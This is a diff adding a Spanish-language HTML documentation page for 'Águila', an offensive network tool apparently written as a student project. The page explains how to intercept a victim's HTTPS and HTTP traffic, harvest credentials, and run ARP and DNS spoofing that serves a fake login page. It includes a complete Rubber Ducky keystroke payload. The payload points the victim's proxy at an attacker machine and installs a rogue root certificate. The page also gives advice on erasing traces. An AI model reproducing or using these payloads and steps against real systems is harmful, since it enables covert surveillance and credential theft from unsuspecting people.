@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Documentación Águila</title>
+<link rel="icon" href="images/LogoM4nu.png" type="image/png">
+<!-- Font Awesome 5.15.1 CSS -->
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css'><link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css'>
+<style>
+    body {
+        height: 100%; 
+        margin: 0; 
+        background-color: #202124;
+        color: #E8EAED;
+    }
+
+    p {
+        color: #E8EAED;
+        font-size: 20px;
+        font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    }
+
+    .container {
+        display: flex;
+        width: 100%;
+        height: 100vh; 
+        overflow: hidden;
+    }
+
+    .menu {
+        width: 27%;
+        background-color: #303134;
+        padding: 5px;
+        height: 100%;
+        overflow-y: auto; 
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        box-shadow: 8px 0 15px -5px rgba(45, 45, 45, 0.5);
+        position: fixed; 
+    }
+
+    .content {
+        width: 74.2%; 
+        margin-left: 25.8%; 
+        overflow-y: auto; 
+        height: 100vh; 
+    }
+
+    .content-section {
+        margin-top: 3%;
+        margin-left: 4%;
+        margin-right: 5%;
+        font-family: 'Courier New', Courier, monospace;
+        word-wrap: break-word;
+    }
+
+    .menu-item {
+        width: 80%; 
+        margin-bottom: 10px;
+        padding: 10px;
+        background-color: #3C4043;
+        cursor: pointer;
+        border-radius: 10px;
+        text-align: center; 
+        font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    }
+
+    .menu-item:hover, .menu-item.active {
+        background-color: #5E6367;
+    }
+
+    .ascii-art {
+        font-family: monospace; 
+        white-space: pre; 
+        text-align: center;
+        width: 100%;
+        color: #BB86FC;
+        font-weight: bold;
+    }
+
+    .code {
+        background-color: #333336; 
+        border: 1px solid #333336;
+        padding: 15px; 
+        overflow-x: auto;
+        font-family: 'Courier New', Courier, monospace; 
+        font-size: 0.95em; 
+        line-height: 1.5;
+        margin: 20px 0; 
+        white-space: pre-wrap; 
+        word-wrap: break-word;
+        box-shadow: 0 2px 4px #4f4d4d;
+        border-radius: 4px; 
+    }
+
+    code {
+        color: #FFAB91; 
+    }
+
+    a {
+        color: #BB86FC;
+    }
+
+    a:hover {
+        text-decoration: underline;
+    }
+
+    .img {
+        display: block;
+        margin-left: 30%;
+        margin-bottom: 3%;
+        max-width: 100%; 
+        margin-top: 3%;
+        width: 25%;
+        height: 20%;
+    }
+
+    .titulito{
+        font-size: 22px;
+        color: #BB86FC; /* Consider changing this if you want to match the new color scheme */
+    }
+
+    h1 {
+        color: #BB86FC;
+    }
+</style>
+
+</head>
+<body>
+
+<div class="container">
+    <div class="menu">
+        <pre class="ascii-art">                    
+                               /T /I                     
+                              / |/ | .-~/                
+                          T\ Y  I  |/  /  _              
+         /T               | \I  |  I  Y.-~/              
+        I l   /I       T\ |  |  l  |  T  /               
+     T\ |  \ Y l  /T   | \I  l   \ `  l Y                
+ __  | \l   \l  \I l __l  l   \   `  _. |                
+ \ ~-l  `\   `\  \  \\ ~\  \   `. .-~   |                
+  \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |                
+.--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./                
+ >--.  ~-.   ._  ~>-"    "\\   7   7   ]                 
+^.___~"--._    ~-{  .-~ .  `\ Y . /    |                 
+ <__ ~"-.  ~       /_/   \   \I  Y   : |                 
+   ^-.__           ~(_/   \   >._:   | l______           
+       ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.       
+              (_/ .  ~(   /'     "~"--,Y   -=b-. _)      
+               (_/ .  \  :           / l      c"~o \     
+                \ /    `.    .     .^   \_.-~"~--.  )    
+                 (_/ .   `  /     /       !       )/     
+                  / / _.   '.   .':      /        '      
+                  ~(_/ .   /    _  `  .-<_               
+                    /_/ . ' .-~" `.  / \  \          ,z=.
+                    ~( /   '  :   | K   "-.~-.______//   
+                      "-,.    l   I/ \_    __{--->._(==. 
+                       //(     \  <    ~"~"     //       
+                      /' /\     \  \     ,v=.  ((        
+                    .^. / /\     "  }__ //===-  `        
+                   / / ' '  "-.,__ {---(==-              
+                 .^ '       :  T  ~"   ll     -By M4nu      
+                / .  .  . : | :!        \\               
+               (_/  /   | | j-"          ~^              
+                 ~-__(_.^-~"                             
+                       
+        </pre>
+            <div class="menu-item" data-content="indice">Índice</div>
+            <div class="menu-item" data-content="instalacion">Instalación</div>
+            <div class="menu-item" data-content="Aguila-Https">Águila-Https</div>
+            <div class="menu-item" data-content="Aguila-Http">Águila-Http</div>
+            <div class="menu-item" data-content="Aguila-Infection">Águila-Infection</div>
+            <div class="menu-item" data-content="Autor">Autor</div>
+    </div>
+<div class="content">
+    <div id="indice" class="content-section">
+            <h1>ÍNDICE</h1>
+            <p><B>Águila</B> fue programada por <a href="https://www.linkedin.com/in/manuelgalans"><B>M4nu</B></a>. Aguila es una herramienta diseñada para la vigilancia y manipulación de tráfico de red en tiempo real. Aguila permite interceptar, analizar y alterar la comunicación entre<br> dispositivos en una red. Funciona principalmente en tres modos: Aguila-Https, Aguila-Http y Aguila-Infection.<br><br>
+
+                <b>Aguila-Https:</b> Este modo utiliza un proxy y la herramienta mitmdump para interceptar y analizar tráfico HTTPS. Permite> visualizar y modificar datos que por lo general están cifrados, como las solicitudes de sitios web y los datos enviados a través de formularios como las credenciales, ademas cuenta con otra herramienta que sin necesidad de configurar el proxy<br> puede interceptar el trafico de dominios visitados por la víctima.
+        <br><br><b>Aguila-Http:</b> Se enfoca en el tráfico HTTP. Captura URLs visitadas y puede detectar posibles credenciales enviadas sin cifrar, como nombres de usuario y contraseñas.
+        <br><br><b>Aguila-Infection:</b> Esta funcionalidad permite el "envenenamiento" de dominios específicos. Esto significa que cuando un dispositivo> intenta acceder a un dominio envenenado, Aguila redirige la solicitud a una página controlada por el atacante, permitiendo implantar contenido específico o capturar más datos del usuario engañado.
+        <br><br><b class="titulito">Iniciar Águila</b>
+        <p>Antes de iniciar Aguila se recomienda leer el apartado de instalación.</p>
+        <pre class="code"><code>sudo ./Aguila</code></pre>
+        <img src="images/AguilaMain.png" alt="Imagen principal de Águila" class="img" style="border-radius: 5%;">
+    </div>
+
+    <div id="instalacion" class="content-section" style="display: none;">
+        <h1>INSTALACIÓN</h1>
+        <p>Para acceder a Águila, es necesario utilizar la consola de Linux. Para empezar, se debe clonar el repositorio desde GitHub, que puedes encontrar en este enlace: <a href="https://github.com/M4nugs?tab=repositories">GitHub de Águila</a>.<br><br> Una vez dentro del repositorio, procedemos a clonarlo utilizando el comando Git y luego otorgamos los permisos necesarios.</p>
+
+        <pre class="code"><code>git clone https://github.com/M4nugs?tab=repositories
+cd Aguila
+cd main
+chmod +x Aguila.py AguilaHttps.py mitmdupm 
+sudo apt install libnetfilter-queue-dev; pip3 install netfilterqueue netifaces scapy termcolor mitmproxy urllib3
+sudo ./Aguila</code></pre>
+            
+
+    </div>
+
+
+    <div id="Aguila-Https" class="content-section" style="display: none;">
+        
+        <h1>ÁGUILA-HTTPS</h1>
+        <p><b class="titulito">Introducción</b><br><br>
+            El apartado de Águila Https incluye dos herramientas: Aguila-Https y Águila-Dominios-Https. Estas facilitan la recolección y análisis de paquetes https, permitiendo capturar tanto credenciales como los dominios que visita la máquina objetivo.<br><br><br>
+            <b class="titulito">Explicación de las Utilidades:</b><br><br>
+            <b>Aguila-Https:</b> Para utilizar esta función, es necesario configurar el proxy en la máquina objetivo. Más abajo, en la sección de configurar proxy, te mostramos cómo hacerlo, tanto manualmente como automáticamente con un Rubber Ducky. Aguila-Https utiliza mitmdump junto con un filtro que nos permite visualizar los paquetes más relevantes, incluyendo dominios y credenciales.<br><br>
+            <b>Aguila-Dominios-Https:</b> Para emplear esta función de Águila, solo necesitas estar en la misma red wifi que la víctima y conocer su dirección IP. La herramienta realiza un arp-scan antes de ejecutar el ataque para que puedas identificar todas las IPs en tu red. Una vez seleccionada la dirección, puedes comenzar a monitorear todos los dominios que visita la víctima.<br></p>          
+           <img src="images/Aguila-Https.png" class="img">
+           <h1>CONFIGURAR PROXY</h1>
+        <p>
+           Para configurar el certificado falso en la máquina de la víctima, y poder ver las consultas https es necesario hacer una 
+           serie de pasos, para ello primero vamos a explicar como serian los pasos manualmente y leego te daremos un código para 
+           una Rubber Ducky para que se hagan todos los pasos en excasos segundos y automaticamente.<br><br>
+           <b class="titulito">Configuración Automatica:</b><br><br>
+           
+           Para ejecutar este método, necesitarás un <a href="https://a.aliexpress.com/_EQEjeD5">Rubber Ducky</a>. Configúralo e inserta el siguiente código:<br><br>
+
+           <pre class="code"><code>REM Inicia una instancia de cmd como administrador
+DELAY 500
+GUI d
+DELAY 300
+GUI
+DELAY 300
+STRING proxy
+DELAY 500
+ENTER
+DELAY 1000
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 200
+SPACE
+DELAY 200
+TAB
+DELAY 200
+STRING 192.168.1.45
+DELAY 200
+TAB
+DELAY 200
+STRING 8080
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 200
+ALT F4
+DELAY 700
+GUI
+DELAY 200
+STRING edge
+DELAY 300
+ENTER
+DELAY 2000
+STRING mitm.it
+DELAY 300
+ENTER
+DELAY 1000
+TAB
+DELAY 500
+ENTER
+DELAY 800
+TAB
+DELAY 400
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 300
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 200
+DOWN
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 200
+DOWN
+DELAY 200
+ENTER
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+ENTER
+DELAY 500
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 500
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 200
+ALT F4
+DELAY 700</code></pre>
+<p>Este código es ajustables, tomalo como referencia pero no como definitivo.</p>
+<video width="320" height="240" style="margin-left: 30%;" controls>
+    <source src="images/VideoRubberDucky.mp4" type="video/mp4">
+    Tu navegador no admite el elemento <code>video</code>.
+</video><br><br>
+
+           <b class="titulito">Configuración Manual:</b><br><br>
+
+           <p>Tanto en la configuración manual como en la automática, primero ejecutamos Aguila-Https apuntando a la máquina víctima. Luego, en la máquina víctima, realizamos las siguientes modificaciones (las imágenes son de Windows 10, pero el proceso es el mismo para otras versiones):</p><br>
+           
+           <p>· Vamos a la configuración de Windows y accedemos a la configuración del proxy</p>
+           
+           <img src="images/Tuto1.png" class="img"><br><br>
+           
+           <p>· Después, con Aguila-Https ejecutándose en la máquina atacante, ingresamos a <a href="http://mitm.it">http://mitm.it</a>, hacemos clic en el certificado y se instala automáticamente:</p><br>
+           
+           <img src="images/Tuto2.png" style="width: 50%; margin-left: 17%;"><br><br>
+           
+           <p>· Al descargar, seleccionamos "Siguiente/Sí" hasta que se nos pregunte dónde queremos guardar el certificado. Debe guardarse en el Almacén de Entidades de Certificación Raíz de Confianza:</p><br>
+           
+           <img src="images/Tuto3.png" style="width: 30%; margin-left: 25%;"><br><br>
+           
+           <p>· Aunque no es obligatorio, es recomendable eliminar el certificado una vez instalado. Para ello, ve a la carpeta de Descargas, elimina el archivo y vacía la papelera. Lo necesario se ha almacenado previamente donde indicamos, así que no quedará ningún rastro.</p>           
+          
+        </p>
+        </div>
+
+        <div id="Aguila-Http" class="content-section" style="display: none;">
+            <h1>ÁGUILA-HTTP</h1>
+            <p><b class="titulito">Introducción</b><br><br>
+                El módulo Águila Http permite implementar un demonio en la red que recopila consultas HTTP y credenciales
+                contenidas en paquetes HTTP. Esta información se acumula para su posterior recuperación al cerrar la sesión,
+                facilitando la captura de paquetes HTTP sin necesidad de supervisión constante.<br><br><br>
+                <b class="titulito">Explicación de uso:</b><br><br>
+                <b>Aguila-Http:</b> Esta utilidad es la más sencilla de todas. Al iniciar, solicitará definir la red a escanear
+                (por ejemplo, 192.168.1.0/24). Se realizará un arp-scan para configurar la dirección IP donde se establecerá el demonio.
+                Una vez configurado, Águila comenzará a recopilar todos los paquetes, incluyendo los de dominios y credenciales.<br>
+                <img src="images/Aguila-http.png" style="width: 60%; margin-left: 15%; margin-top: 5%;">
+            </p><br>
+        </div>
+
+
+
+        <div id="Aguila-Infection" class="content-section" style="display: none;">
+            <h1>ÁGUILA-INFECTION</h1>
+            <p>
+                <b class="titulito">Introducción</b><br><br>
+                "Águila-Infection" es una técnica para modificar el contenido que la víctima ve en los dominios que visita, permitiendo al atacante insertar cualquier contenido deseado. Esta herramienta se utiliza para obtener credenciales de sitios HTTPS de manera más directa que "Aguila-Https", sin la necesidad de un proxy. Simulando sitios legítimos, permite la captura de credenciales del usuario.<br><br><br>
+                
+                <b class="titulito">Explicación de Utilidades:</b><br><br>
+                <b>Aguila-arp-spoof:</b> Esta función actúa como intermediario entre el router y la víctima, controlando los paquetes de datos entrantes y salientes. Este método, conocido como "man in the middle", es fundamental para la manipulación de paquetes que serán alterados posteriorment usando "Aguila-dns-spoofer".<br><br>
+                
+                <b>Aguila-dns-spoofer:</b> Con el control de paquetes establecido por "Aguila-arp-spoof", "Aguila-dns-spoofer" modifica y redirige estos paquetes a voluntad. Esta herramienta facilita el envenenamiento de DNS al elegir los dominios que se desean afectar.<br><br><br>
+                
+                <b class="titulito">Explicación de Uso:</b><br><br>
+
+                Ya sabemos para que sirve Aguila-arp-spoof y Aguila-dns-spoofer es hora de ponerlas en uso, para ello vamos a necesitar
+                dos terminales, una donde ejecutaremos el Aguila-arp-spoof y otra donde ejecutaremos Aguila-dns-spoofer, pero vamos por
+                pasos, primero ejecutamos Aguila-arp-spoof y escogemos la victima:<br>
+            </p>
+                <img src="images/Aguila-arp-spoof.png" class="img" style="width: 80%; margin-left: 10%;">
+            <p>
+                Victima comprometida, ahora tenemos que cambiar los paquetes dns, dejamos Aguila-arp-spoof ejecutandose, nos vamos a otra
+                terminal, y ejecutamos Aguila-dns-spoofer, escogemos los dominios que queremos cambiar y ya nos pertenecen esos dominios,
+                pero... ¿Como podemos enseñar en el dominio lo que nosotros queramos? pues simple, una vez que se este ejecutando Aguila-arp-spoof
+                y Aguila-dns-spoofer cada vez que la víctima visite los dominios envenenados le va a salir un error, pero para que le salga lo
+                que nosotros queremos que se vea, tendremos que irnos a otra terminal y abrir un puerto en python (python3 -m htt.server), antes
+                de abrirlo debemos de tener el index.html en el directorio una vez hecho esto cada vez que la victima abra estos dominios, le saldra
+                el index html que nosotros estamos enviando sdesde nuestro servidor python.<br><br>
+            </p>
+            <img src="images/Envenenamiento-dns.png" style="width: 80%; margin-left: 10%;">
+            <p>
+                <b class="titulito">Error:</b><br><br>
+                Si por algun error te quedas sin conexión por una salida mal ejecutada del script, ejecute el siguiente comandos:
+                <pre class="code"><code>sudo iptables -D INPUT -j NFQUEUE --queue-num 0; sudo iptables -D OUTPUT -j NFQUEUE --queue-num 0; sudo iptables -D FORWARD -j NFQUEUE --queue-num 0</code></pre>
+            </p><br>
+        </div>
+
+        <div id="Autor" class="content-section" style="display: none;">
+            <h1>AUTOR</h1>
+            <p>
+                <b class="titulito">¿Quien soy?</b><br><br>
+                Soy <a href="https://www.linkedin.com/in/manuelgalans"><b>M4nu</b></a>, actualmente tengo 20 años. Me inicié en el mundo de la ciberseguridad
+                a través de un Grado Superior en Desarrollo de Aplicaciones Multiplataforma, el cual empecé sin saber que acabaría decantándome por el ámbito 
+                de la ciberseguridad. A través de una asignatura en el segundo año de este grado, comenzó a llamarme la atención y me dediqué a estudiar todos 
+                los días. Hoy en día, estoy realizando mis prácticas en <a href="https://beehackers.es/"><B>BeeHackers</B></a>.
+                <br><br><br>
+                <b class="titulito">¿Porque cree Águila?</b><br><br>
+                Script Kiddie es aquel que se siente hacker por tan solo utilizar las herramientas de los demás. Todos lo somos y lo seremos, pero el que de verdad quiere aprender y llegar a un paso más que todos los demás es aquel que crea nuevas herramientas, nuevos 0days, etc. Yo no he descubierto nada; de hecho, todas estas técnicas se llevan utilizando desde hace muchísimo tiempo, pero después de crear Águila, espero haber aportado mi granito de arena a la comunidad y ser un poco menos script kiddie. Esa es la verdadera razón por la que he creado Águila. Bueno... además que es mi trabajo de fin de curso xd.<br><br><br><br>
+                <!-- Botones de Redes Sociales -->
+                <div style="display: flex; justify-content: center; align-items: center;">
+                    <a href="https://www.linkedin.com/in/manuelgalans" class="social-button" target="_blank" style="font-size: 24px; padding: 10px 20px; background-color: #0e76a8; color: white; border-radius: 5px; margin: 5px; text-decoration: none;">
+                        <i class="fab fa-linkedin"></i> LinkedIn
+                    </a>
+                    <img src="images/LogoM4nu.png" style="width: 20%; margin: 0 5%; vertical-align: middle;">
+                    <a href="https://github.com/m4nugs" class="social-button" target="_blank" style="font-size: 24px; padding: 10px 20px; background-color: #333; color: white; border-radius: 5px; margin: 5px; text-decoration: none;">
+                        <i class="fab fa-github"></i> GitHub
+                    </a>
+                </div>
+                
+            </p>
+        </div>
+        
+        
+        
+
+
+</div>
+
+
+    
+    
+
+
+   
+
+</div>
+
+<script>
+    // Asegurar que solo la sección de introducción sea visible inicialmente
+    document.addEventListener('DOMContentLoaded', function() {
+    document.querySelectorAll('.content-section').forEach(section => {
+        section.style.display = 'none'; // Ocultar todas las secciones
+    });
+    document.getElementById('indice').style.display = 'block'; // Mostrar al iniciar la web ---------------------------
+    document.querySelectorAll('.menu-item').forEach(item => {
+        item.classList.remove('active'); // Remover la clase active de todos
+    });
+    document.querySelector('[data-content="indice"]').classList.add('active'); // Añadir clase active al índice
+});
+
+    
+    // Cambiar de sección al hacer clic en los ítems del menú
+    document.querySelectorAll('.menu-item').forEach(item => {
+        item.addEventListener('click', function() {
+            document.querySelectorAll('.menu-item').forEach(i => {
+                i.classList.remove('active'); // Remueve la clase 'active' de todos
+            });
+            item.classList.add('active'); // Añade 'active' al elemento clickeado
+    
+            // Oculta todas las secciones de contenido
+            document.querySelectorAll('.content-section').forEach(section => {
+                section.style.display = 'none';
+            });
+    
+            const contentId = item.getAttribute('data-content');
+            document.getElementById(contentId).style.display = 'block';
+        });
+    });
+
+
+</script>
+
+</body>
+</html>
+
+
+
